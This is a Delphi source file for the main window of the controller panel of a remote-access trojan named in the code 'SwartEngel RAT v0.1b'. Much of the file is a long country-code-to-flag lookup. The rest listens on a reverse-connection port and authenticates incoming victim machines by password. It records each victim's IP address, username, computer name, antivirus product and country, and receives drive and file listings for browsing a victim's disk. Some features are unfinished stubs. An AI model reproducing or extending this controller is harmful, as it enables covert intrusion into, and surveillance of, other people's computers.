unit untfrmMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, XPMan, StdCtrls, ScktComp, Buttons, ImgList;

type
  TfrmMain = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    XPManifest1: TXPManifest;
    lvConnections: TListView;
    lvStats: TListView;
    chkSaveStatistics: TCheckBox;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    txtReverseConnectionPort: TEdit;
    Label2: TLabel;
    txtPassword: TEdit;
    chkHidePassword: TCheckBox;
    chkNotifyOnNewConnection: TCheckBox;
    chkNotifyOnDisconnection: TCheckBox;
    sckServer: TServerSocket;
    GroupBox2: TGroupBox;
    lblTotalAttemptedConnections: TLabel;
    lblTotalSuccessfulConnections: TLabel;
    GroupBox3: TGroupBox;
    lblTotalSentData: TLabel;
    lblTotalReceivedData: TLabel;
    il1: TImageList;
    btn1: TBitBtn;
    btn2: TBitBtn;
    edt1: TEdit;
    grp2: TGroupBox;
    chk4: TCheckBox;
    chk5: TCheckBox;
    grp1: TGroupBox;
    chk1: TCheckBox;
    chk2: TCheckBox;
    chk3: TCheckBox;
    cmdSaveSettings: TBitBtn;
    ilSinFlags: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure sckServerClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure sckServerClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure sckServerClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure mnuExitClick(Sender: TObject);
    procedure mnuAboutClick(Sender: TObject);
    procedure cmdSaveSettingsClick(Sender: TObject);
    procedure lvConnectionsDblClick(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure chk3Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmMain: TfrmMain;
  iAttempted: Integer;
  iSuccessful: Integer;
  iReceived: Integer;
  iSelectedConnection: Integer;

implementation

uses untfrmAbout, untFunc, untfrmManage, Unit1, untInfo;

{$R *.dfm}

function GetCountryFlag(CountryCode: string): Integer;
begin
  CountryCode := LowerCase(CountryCode);
  Result := 239; //unknown

  if countryCode = 'ad' then
  begin
    Result := 0;
  end

  else if CountryCode = 'ae' then
  begin
    Result := 1;
  end

  else if CountryCode = 'af' then
  begin
    Result := 2;
  end

  else if CountryCode = 'ag' then
  begin
    Result := 3;
  end

  else if CountryCode = 'ai' then
  begin
    Result := 4;
  end

  else if CountryCode = 'al' then
  begin
    Result := 5;
  end

  else if CountryCode = 'am' then
  begin
    Result := 6;
  end

  else if CountryCode = 'an' then
  begin
    Result := 7;
  end

  else if CountryCode = 'ao' then
  begin
    Result := 8;
  end

  else if CountryCode = 'ar' then
  begin
    Result := 9;
  end

  else if CountryCode = 'as' then
  begin
    Result := 10;
  end

  else if CountryCode = 'at' then
  begin
    Result := 11;
  end

  else if CountryCode = 'au' then
  begin
    Result := 12;
  end

  else if CountryCode = 'aw' then
  begin
    Result := 13;
  end

  else if CountryCode = 'ax' then
  begin
    Result := 14;
  end

  else if CountryCode = 'az' then
  begin
    Result := 15;
  end

  else if CountryCode = 'ba' then
  begin
    Result := 16;
  end

  else if CountryCode = 'bb' then
  begin
    Result := 17;
  end

  else if CountryCode = 'bd' then
  begin
    Result := 18;
  end

  else if CountryCode = 'be' then
  begin
    Result := 19;
  end

  else if CountryCode = 'bf' then
  begin
    Result := 20;
  end

  else if CountryCode = 'bg' then
  begin
    Result := 21;
  end

  else if CountryCode = 'bh' then
  begin
    Result := 22;
  end

  else if CountryCode = 'bi' then
  begin
    Result := 23;
  end

  else if CountryCode = 'bj' then
  begin
    Result := 24;
  end

  else if CountryCode = 'bm' then
  begin
    Result := 25;
  end

  else if CountryCode = 'bn' then
  begin
    Result := 26;
  end

  else if CountryCode = 'bo' then
  begin
    Result := 27;
  end

  else if CountryCode = 'br' then
  begin
    Result := 28;
  end

  else if CountryCode = 'bs' then
  begin
    Result := 29;
  end

  else if CountryCode = 'bt' then
  begin
    Result := 30;
  end

  else if CountryCode = 'bv' then
  begin
    Result := 31;
  end

  else if CountryCode = 'bw' then
  begin
    Result := 32;
  end

  else if CountryCode = 'by' then
  begin
    Result := 33;
  end

  else if CountryCode = 'bz' then
  begin
    Result := 34;
  end

  else if CountryCode = 'ca' then
  begin
    Result := 35;
  end

  else if CountryCode = 'cc' then
  begin
    Result := 36;
  end

  else if CountryCode = 'cd' then
  begin
    Result := 37;
  end

  else if CountryCode = 'cf' then
  begin
    Result := 38;
  end

  else if CountryCode = 'cg' then
  begin
    Result := 39;
  end

  else if CountryCode = 'ch' then
  begin
    Result := 40;
  end

  else if CountryCode = 'ci' then
  begin
    Result := 41;
  end

  else if CountryCode = 'ck' then
  begin
    Result := 42;
  end

  else if CountryCode = 'cl' then
  begin
    Result := 43;
  end

  else if CountryCode = 'cm' then
  begin
    Result := 44;
  end

  else if CountryCode = 'cn' then
  begin
    Result := 45;
  end

  else if CountryCode = 'co' then
  begin
    Result := 46;
  end

  else if CountryCode = 'cr' then
  begin
    Result := 47;
  end

  else if CountryCode = 'cs' then
  begin
    Result := 48;
  end

  else if CountryCode = 'cu' then
  begin
    Result := 49;
  end

  else if CountryCode = 'cv' then
  begin
    Result := 50;
  end

  else if CountryCode = 'cx' then
  begin
    Result := 51;
  end

  else if CountryCode = 'cy' then
  begin
    Result := 52;
  end

  else if CountryCode = 'cz' then
  begin
    Result := 53;
  end

  else if CountryCode = 'de' then
  begin
    Result := 54;
  end

  else if CountryCode = 'dj' then
  begin
    Result := 55;
  end

  else if CountryCode = 'dk' then
  begin
    Result := 56;
  end

  else if CountryCode = 'dm' then
  begin
    Result := 57;
  end

  else if CountryCode = 'do' then
  begin
    Result := 58;
  end

  else if CountryCode = 'dz' then
  begin
    Result := 59;
  end

  else if CountryCode = 'ec' then
  begin
    Result := 60;
  end

  else if CountryCode = 'ee' then
  begin
    Result := 61;
  end

  else if CountryCode = 'eg' then
  begin
    Result := 62;
  end

  else if CountryCode = 'eh' then
  begin
    Result := 63;
  end

  else if CountryCode = 'England' then
  begin
    Result := 64; //england but wana use union jack
  end

  else if CountryCode = 'er' then
  begin
    Result := 65;
  end

  else if CountryCode = 'es' then
  begin
    Result := 66;
  end

  else if CountryCode = 'et' then
  begin
    Result := 67;
  end

  else if CountryCode = 'fam' then
  begin
    Result := 68; //not sure if legit might be famfamfam flag..
  end

  else if CountryCode = 'fi' then
  begin
    Result := 69;
  end

  else if CountryCode = 'fj' then
  begin
    Result := 70;
  end

  else if CountryCode = 'fk' then
  begin
    Result := 71;
  end

  else if CountryCode = 'fm' then
  begin
    Result := 72;
  end

  else if CountryCode = 'fo' then
  begin
    Result := 73;
  end

  else if CountryCode = 'fr' then
  begin
    Result := 74;
  end

  else if CountryCode = 'ga' then
  begin
    Result := 75;
  end

  else if CountryCode = 'gb' then
  begin
    Result := 76; //union jack
  end

  else if CountryCode = 'gd' then
  begin
    Result := 77;
  end

  else if CountryCode = 'ge' then
  begin
    Result := 78;
  end

  else if CountryCode = 'gh' then
  begin
    Result := 79;
  end

  else if CountryCode = 'gi' then
  begin
    Result := 80;
  end

  else if CountryCode = 'gl' then
  begin
    Result := 81;
  end

  else if CountryCode = 'gm' then
  begin
    Result := 82;
  end

  else if CountryCode = 'gn' then
  begin
    Result := 83;
  end

  else if CountryCode = 'gp' then
  begin
    Result := 84;
  end

  else if CountryCode = 'gq' then
  begin
    Result := 85;
  end

  else if CountryCode = 'gr' then
  begin
    Result := 86;
  end

  else if CountryCode = 'gs' then
  begin
    Result := 87;
  end

  else if CountryCode = 'gt' then
  begin
    Result := 88;
  end

  else if CountryCode = 'gu' then
  begin
    Result := 89;
  end

  else if CountryCode = 'gw' then
  begin
    Result := 90;
  end

  else if CountryCode = 'gy' then
  begin
    Result := 91;
  end

  else if CountryCode = 'hk' then
  begin
    Result := 92;
  end

  else if CountryCode = 'hn' then
  begin
    Result := 93;
  end

  else if CountryCode = 'hr' then
  begin
    Result := 94;
  end

  else if CountryCode = 'ht' then
  begin
    Result := 95;
  end

  else if CountryCode = 'hu' then
  begin
    Result := 96;
  end

  else if CountryCode = 'id' then
  begin
    Result := 97;
  end

  else if CountryCode = 'ie' then
  begin
    Result := 98;
  end

  else if CountryCode = 'il' then
  begin
    Result := 99;
  end

  else if CountryCode = 'in' then
  begin
    Result := 100;
  end

  else if CountryCode = 'io' then
  begin
    Result := 101;
  end

  else if CountryCode = 'iq' then
  begin
    Result := 102;
  end

  else if CountryCode = 'ir' then
  begin
    Result := 103;
  end

  else if CountryCode = 'is' then
  begin
    Result := 104;
  end

  else if CountryCode = 'it' then
  begin
    Result := 105;
  end

  else if CountryCode = 'jm' then
  begin
    Result := 106;
  end

  else if CountryCode = 'jo' then
  begin
    Result := 107;
  end

  else if CountryCode = 'jp' then
  begin
    Result := 108;
  end

  else if CountryCode = 'ke' then
  begin
    Result := 109;
  end

  else if CountryCode = 'kg' then
  begin
    Result := 110;
  end

  else if CountryCode = 'kh' then
  begin
    Result := 111;
  end

  else if CountryCode = 'ki' then
  begin
    Result := 112;
  end

  else if CountryCode = 'km' then
  begin
    Result := 113;
  end

  else if CountryCode = 'kn' then
  begin
    Result := 114;
  end

  else if CountryCode = 'kp' then
  begin
    Result := 115;
  end

  else if CountryCode = 'kr' then
  begin
    Result := 116;
  end

  else if CountryCode = 'kw' then
  begin
    Result := 117;
  end

  else if CountryCode = 'ky' then
  begin
    Result := 118;
  end

  else if CountryCode = 'kz' then
  begin
    Result := 119;
  end

  else if CountryCode = 'la' then
  begin
    Result := 120;
  end

  else if CountryCode = 'lb' then
  begin
    Result := 121;
  end

  else if CountryCode = 'lc' then
  begin
    Result := 122;
  end

  else if CountryCode = 'li' then
  begin
    Result := 123;
  end

  else if CountryCode = 'lk' then
  begin
    Result := 124;
  end

  else if CountryCode = 'lr' then
  begin
    Result := 125;
  end

  else if CountryCode = 'ls' then
  begin
    Result := 126;
  end

  else if CountryCode = 'lt' then
  begin
    Result := 127;
  end

  else if CountryCode = 'lu' then
  begin
    Result := 128;
  end

  else if CountryCode = 'lv' then
  begin
    Result := 129;
  end

  else if CountryCode = 'ly' then
  begin
    Result := 130;
  end

  else if CountryCode = 'ma' then
  begin
    Result := 131;
  end

  else if CountryCode = 'mc' then
  begin
    Result := 132;
  end

  else if CountryCode = 'md' then
  begin
    Result := 133;
  end

  else if CountryCode = 'mg' then
  begin
    Result := 134;
  end

  else if CountryCode = 'mh' then
  begin
    Result := 135;
  end

  else if CountryCode = 'mk' then
  begin
    Result := 136;
  end

  else if CountryCode = 'ml' then
  begin
    Result := 137;
  end

  else if CountryCode = 'mm' then
  begin
    Result := 138;
  end

  else if CountryCode = 'mn' then
  begin
    Result := 139;
  end

  else if CountryCode = 'mo' then
  begin
    Result := 140;
  end

  else if CountryCode = 'mp' then
  begin
    Result := 141;
  end

  else if CountryCode = 'mq' then
  begin
    Result := 142;
  end

  else if CountryCode = 'mr' then
  begin
    Result := 143;
  end

  else if CountryCode = 'ms' then
  begin
    Result := 144;
  end

  else if CountryCode = 'mt' then
  begin
    Result := 145;
  end

  else if CountryCode = 'mu' then
  begin
    Result := 146;
  end

  else if CountryCode = 'mv' then
  begin
    Result := 147;
  end

  else if CountryCode = 'mw' then
  begin
    Result := 148;
  end

  else if CountryCode = 'mx' then
  begin
    Result := 149;
  end

  else if CountryCode = 'my' then
  begin
    Result := 150;
  end

  else if CountryCode = 'mz' then
  begin
    Result := 151;
  end

  else if CountryCode = 'na' then
  begin
    Result := 152;
  end

  else if CountryCode = 'nc' then
  begin
    Result := 153;
  end

  else if CountryCode = 'ne' then
  begin
    Result := 154;
  end

  else if CountryCode = 'nf' then
  begin
    Result := 155;
  end

  else if CountryCode = 'ng' then
  begin
    Result := 156;
  end

  else if CountryCode = 'ni' then
  begin
    Result := 157;
  end

  else if CountryCode = 'nl' then
  begin
    Result := 158;
  end

  else if CountryCode = 'no' then
  begin
    Result := 159;
  end

  else if CountryCode = 'np' then
  begin
    Result := 160;
  end

  else if CountryCode = 'nr' then
  begin
    Result := 161;
  end

  else if CountryCode = 'nu' then
  begin
    Result := 162;
  end

  else if CountryCode = 'nz' then
  begin
    Result := 163;
  end

  else if CountryCode = 'om' then
  begin
    Result := 164;
  end

  else if CountryCode = 'pa' then
  begin
    Result := 165;
  end

  else if CountryCode = 'pe' then
  begin
    Result := 166;
  end

  else if CountryCode = 'pf' then
  begin
    Result := 167;
  end

  else if CountryCode = 'pg' then
  begin
    Result := 168;
  end

  else if CountryCode = 'ph' then
  begin
    Result := 169;
  end

  else if CountryCode = 'pk' then
  begin
    Result := 170;
  end

  else if CountryCode = 'pl' then
  begin
    Result := 171;
  end

  else if CountryCode = 'pm' then
  begin
    Result := 172;
  end

  else if CountryCode = 'pn' then
  begin
    Result := 173;
  end

  else if CountryCode = 'pr' then
  begin
    Result := 174;
  end

  else if CountryCode = 'ps' then
  begin
    Result := 175;
  end

  else if CountryCode = 'pt' then
  begin
    Result := 176;
  end

  else if CountryCode = 'pw' then
  begin
    Result := 177;
  end

  else if CountryCode = 'py' then
  begin
    Result := 178;
  end

  else if CountryCode = 'qa' then
  begin
    Result := 179;
  end

  else if CountryCode = 'ro' then
  begin
    Result := 180;
  end

  else if CountryCode = 'ru' then
  begin
    Result := 181;
  end

  else if CountryCode = 'rw' then
  begin
    Result := 182;
  end

  else if CountryCode = 'sa' then
  begin
    Result := 183;
  end

  else if CountryCode = 'sb' then
  begin
    Result := 184;
  end

  else if CountryCode = 'sc' then
  begin
    Result := 185;
  end

  else if CountryCode = 'scotland' then
  begin
    Result := 186; //scotish flag but using union jack instead;
  end

  else if CountryCode = 'sd' then
  begin
    Result := 187;
  end

  else if CountryCode = 'se' then
  begin
    Result := 188;
  end

  else if CountryCode = 'sg' then
  begin
    Result := 189;
  end

  else if CountryCode = 'sh' then
  begin
    Result := 190;
  end

  else if CountryCode = 'si' then
  begin
    Result := 191;
  end

  else if CountryCode = 'sk' then
  begin
    Result := 192;
  end

  else if CountryCode = 'sl' then
  begin
    Result := 193;
  end

  else if CountryCode = 'sm' then
  begin
    Result := 194;
  end

  else if CountryCode = 'sn' then
  begin
    Result := 195;
  end

  else if CountryCode = 'so' then
  begin
    Result := 196;
  end

  else if CountryCode = 'sr' then
  begin
    Result := 197;
  end

  else if CountryCode = 'st' then
  begin
    Result := 198;
  end

  else if CountryCode = 'sv' then
  begin
    Result := 199;
  end

  else if CountryCode = 'sy' then
  begin
    Result := 200;
  end

  else if CountryCode = 'sz' then
  begin
    Result := 201;
  end

  else if CountryCode = 'tc' then
  begin
    Result := 202;
  end

  else if CountryCode = 'td' then
  begin
    Result := 203;
  end

  else if CountryCode = 'tf' then
  begin
    Result := 204;
  end

  else if CountryCode = 'tg' then
  begin
    Result := 205;
  end

  else if CountryCode = 'th' then
  begin
    Result := 206;
  end

  else if CountryCode = 'tj' then
  begin
    Result := 207;
  end

  else if CountryCode = 'tk' then
  begin
    Result := 208;
  end

  else if CountryCode = 'tl' then
  begin
    Result := 209;
  end

  else if CountryCode = 'tm' then
  begin
    Result := 210;
  end

  else if CountryCode = 'tn' then
  begin
    Result := 211;
  end

  else if CountryCode = 'to' then
  begin
    Result := 212;
  end

  else if CountryCode = 'tr' then
  begin
    Result := 213;
  end

  else if CountryCode = 'tt' then
  begin
    Result := 214;
  end

  else if CountryCode = 'tv' then
  begin
    Result := 215;
  end

  else if CountryCode = 'tw' then
  begin
    Result := 216;
  end

  else if CountryCode = 'tz' then
  begin
    Result := 217;
  end

  else if CountryCode = 'ua' then
  begin
    Result := 218;
  end

  else if CountryCode = 'ug' then
  begin
    Result := 219;
  end

  else if CountryCode = 'um' then
  begin
    Result := 220;
  end

  else if CountryCode = 'us' then
  begin
    Result := 221;
  end

  else if CountryCode = 'uy' then
  begin
    Result := 222;
  end

  else if CountryCode = 'uz' then
  begin
    Result := 223;
  end

  else if CountryCode = 'va' then
  begin
    Result := 224;
  end

  else if CountryCode = 'vc' then
  begin
    Result := 225;
  end

  else if CountryCode = 've' then
  begin
    Result := 226;
  end

  else if CountryCode = 'vg' then
  begin
    Result := 227;
  end

  else if CountryCode = 'vi' then
  begin
    Result := 228;
  end

  else if CountryCode = 'vn' then
  begin
    Result := 229;
  end

  else if CountryCode = 'vu' then
  begin
    Result := 230;
  end

  else if CountryCode = 'wales' then
  begin //welsh flag use union jack instead;
    Result := 231;
  end

  else if CountryCode = 'wf' then
  begin
    Result := 232;
  end

  else if CountryCode = 'ws' then
  begin
    Result := 233;
  end

  else if CountryCode = 'ye' then
  begin
    Result := 234;
  end

  else if CountryCode = 'yt' then
  begin
    Result := 235;
  end

  else if CountryCode = 'za' then
  begin
    Result := 236;
  end

  else if CountryCode = 'zm' then
  begin
    Result := 237;
  end

  else if CountryCode = 'zw' then
  begin
    Result := 238;
  end

end;

procedure TfrmMain.FormCreate(Sender: TObject);
begin
  ReadSettings(ExtractFilePath(Application.ExeName) + 'Settings.ini');
  StartListening(txtReverseConnectionPort.Text);
end;

procedure TfrmMain.sckServerClientRead(Sender: TObject; Socket:
  TCustomWinSocket);
var
  sData: string;
  sCmd: string;
  sDat: TStringList;
  LV: TListItem;
  Stats: TListItem;
  sDrives: TStringList;
  TDrives: TTreeNode;
  sFiles: TStringList;
  sSizes: TStringList;
  TFiles: TListItem;
  i: Integer;
  h: Integer;
begin
  sData := Socket.ReceiveText;
  sDat := Explode('|', sData);
  sCmd := sDat[0];
  iReceived := iReceived + Length(sData);
  lblTotalReceivedData.Caption := 'Total Received Data: ' + IntToStr(iReceived)
    +
    ' Bytes';

  if sCmd = 'Connect' then
  begin
    iAttempted := iAttempted + 1;
    lblTotalAttemptedConnections.Caption := 'Total Attempted Connections: ' +
      IntToStr(iAttempted);

    if chkNotifyOnNewConnection.Checked then
    begin
      //TrayIcon.ShowBalloonHint('New Connection', 'Latest Connection To Join: ' + Socket.RemoteAddress, bitInfo, 10);
      //ShowMessage('New Connection: ' + Socket.RemoteAddress);
    end;

    if sDat[1] = txtPassword.Text then
    begin
      iSuccessful := iSuccessful + 1;
      lblTotalSuccessfulConnections.Caption := 'Total Successful Connections: '
        + IntToStr(iSuccessful);

      LV := lvConnections.Items.Add;
      LV.Caption := sDat[2];
      LV.SubItems.Add(sDat[3]);
      LV.SubItems.Add(Socket.RemoteAddress);
      LV.SubItems.Add(sDat[4]);
      LV.SubItems.Add(sDat[5]);
      LV.SubItems.Add(sDat[6]);
      LV.SubItems.Add(sDat[7]);
      LV.SubItems.Add(sDat[8]);
      LV.SubItems.Add(sDat[9]);
      LV.SubItems.Add(sDat[10]);
      lv.SubItems.Add(sDat[11]);
      lv.ImageIndex := GetCountryFlag(sDat[8]);
      //lv.SubItems.Add(sDat[12]);

      frmInfo.Show;
      frmInfo.lblIP.Caption := 'IP: ' + LV.SubItems[1];
      frmInfo.lblUsername.Caption := 'Username: ' + LV.SubItems[2];
      frmInfo.lblComputer.caption := 'Computer name: ' + LV.SubItems[3];
      frmInfo.lblServer.Caption := 'AV: ' + LV.SubItems[4];
      {  frmInfo.lblUsername.Caption := lvConnections.Items.Item.SubItems(4);
        frmInfo.lblComputer.caption := lvConnections.Items.Item.SubItems(5);
        frmInfo.lblServer.Caption := lvConnections.Items.Item.SubItems(9);    }

      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.SubItems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Connection Accepted - Password Correct');
    end
    else
    begin
      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.Subitems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Connection Rejected - Password Incorrect');
      Socket.Disconnect(Socket.SocketHandle);
    end;
  end;

  if sCmd = 'Drives' then
  begin
    sDrives := Explode('++', sDat[1]);

    for i := 0 to sDrives.Count - 1 do
    begin
      //TDrives := frmManage.tvFolders.Items.Item
      TDrives := frmManage.tvDrives.Items.Add(nil, sDrives[i]);
      // TDrives := frmManage.cbbDrives.AddItem(sDrives[i], nil);
    end;
  end;

  if sCmd = 'PcInfo' then
  begin
    //  frmManage.lvSystemInformation := Explode('++', sDat[1]);
    //  for i := 0 to lvSystemInformation.Count - 1 do
    //    frmManage.lvSystemInformation := frmManage.lvSystemInformation.items.add(nil, sDat[i]);
    //    end;
  end;

  if sCmd = 'Files' then
  begin
    sDrives := Explode('++', sDat[1]);
    sFiles := Explode('++', sDat[2]);
    sSizes := Explode('++', sDat[3]);

    frmManage.tvDrives.Items.Clear;
    frmManage.lvFiles.Items.Clear;

    for i := 0 to sDrives.Count - 1 do
    begin
      TDrives := frmManage.tvDrives.Items.Add(nil, sDrives[i]);
    end;

    for i := 0 to sFiles.Count - 1 do
    begin
      TFiles := frmManage.lvFiles.Items.Add;
      TFiles.Caption := sFiles[i];
      TFiles.SubItems.Add(sSizes[i]);
    end;
  end;

  RecountConnections;

end;

procedure TfrmMain.sckServerClientDisconnect(Sender: TObject; Socket:
  TCustomWinSocket);
var
  i: Integer;
  Stats: TListItem;
begin
  for i := 0 to lvConnections.Items.Count - 1 do
  begin
    if lvConnections.Items.Item[i].SubItems.Strings[1] = Socket.RemoteAddress
      then
    begin
      lvConnections.Items.Delete(i);
      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.SubItems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Disconnected');

      if chkNotifyOnDisconnection.Checked then
      begin
        //TrayIcon.ShowBalloonHint('Lost Connection', 'Connection Lost To: ' + Socket.RemoteAddress, bitError, 10);
        ShowMessage('Connection Lost: ' + Socket.RemoteAddress);
      end;

      RecountConnections;
      Exit;
    end;
  end;
end;

procedure TfrmMain.sckServerClientError(Sender: TObject; Socket:
  TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
var
  i: Integer;
  Stats: TListItem;
begin
  ErrorCode := 0;
  for i := 0 to lvConnections.Items.Count - 1 do
  begin
    if lvConnections.Items.Item[i].SubItems.Strings[1] = Socket.RemoteAddress
      then
    begin
      lvConnections.Items.Delete(i);
      Stats := lvStats.Items.Add;
      Stats.Caption := TimeToStr(Time);
      Stats.SubItems.Add(Socket.RemoteAddress);
      Stats.SubItems.Add('Error - Disconnected');

      if chkNotifyOnDisconnection.Checked then
      begin
        //TrayIcon.ShowBalloonHint('Lost Connection', 'Connection Lost To: ' + Socket.RemoteAddress, bitError, 10);
        ShowMessage('Lost Connection: ' + Socket.RemoteAddress);
      end;

      RecountConnections;
      Exit;
    end;
  end;
end;

procedure TfrmMain.mnuExitClick(Sender: TObject);
begin
  sckServer.Active := False;
  Halt;
end;

procedure TfrmMain.mnuAboutClick(Sender: TObject);
begin
  frmAbout.Show;
end;

procedure TfrmMain.cmdSaveSettingsClick(Sender: TObject);
begin
  SaveSettings(ExtractFilePath(Application.ExeName) + 'Settings.ini');
  StartListening(txtReverseConnectionPort.Text);
  //  edt1.Text := ('Listening on port: ')
end;

procedure TfrmMain.lvConnectionsDblClick(Sender: TObject);
var
  i: Integer;
  h: Integer;
begin
  for i := 0 to lvConnections.Items.Count - 1 do
  begin
    if lvConnections.Items.Item[i].Selected then
    begin
      for h := 0 to lvConnections.Items.Count - 1 do
      begin
        if lvConnections.Items.Item[i].SubItems.Strings[1] =
          sckServer.Socket.Connections[h].RemoteAddress then
        begin
          iSelectedConnection := h;
          frmManage.Show;
          frmManage.Caption := 'SwartEngel RAT v0.1b - [Managing - ' +
            sckServer.Socket.Connections[h].RemoteAddress + ']';
          Exit;
        end;
      end;
    end;
  end;
end;

procedure TfrmMain.chk2Click(Sender: TObject);
begin
  if chk2.Checked = True then
  begin
    txtPassword.PasswordChar := '*';
  end
  else
    txtPassword.PasswordChar := #0;

end;

procedure TfrmMain.chk3Click(Sender: TObject);
var
  a: integer;
begin
  if chk3.Checked = True then
  begin
    a := lvConnections.Items.Count;
    if a = 200 then
    begin
      lvConnections.Items.Delete(200);

    end;
  end;
end;

procedure TfrmMain.btn2Click(Sender: TObject);

begin
  frmAbout.Show;
end;

end.

